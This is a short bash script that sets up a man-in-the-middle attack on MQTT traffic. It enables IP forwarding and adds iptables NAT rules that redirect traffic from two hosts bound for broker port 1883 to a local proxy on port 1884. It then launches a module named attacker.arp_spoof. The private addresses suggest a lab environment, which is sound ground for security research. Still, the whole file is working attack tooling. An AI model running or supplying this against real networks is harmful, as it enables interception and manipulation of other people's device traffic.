#!/usr/bin/env bash

set -e
sudo sysctl -w net.ipv4.ip_forward=1
# Redirect publisher and subscriber traffic destined for broker:1883 to our proxy
sudo iptables -t nat -C PREROUTING -s 192.168.57.20 -p tcp --dport 1883 -j REDIRECT --to-port 1884 2>/dev/null || \
  sudo iptables -t nat -A PREROUTING -s 192.168.57.20 -p tcp --dport 1883 -j REDIRECT --to-port 1884
sudo iptables -t nat -C PREROUTING -s 192.168.57.30 -p tcp --dport 1883 -j REDIRECT --to-port 1884 2>/dev/null || \
  sudo iptables -t nat -A PREROUTING -s 192.168.57.30 -p tcp --dport 1883 -j REDIRECT --to-port 1884

# Run the ARP spoofer (needs root for raw sockets)
sudo /home/alvin/.venv-vm/bin/python -m attacker.arp_spoof
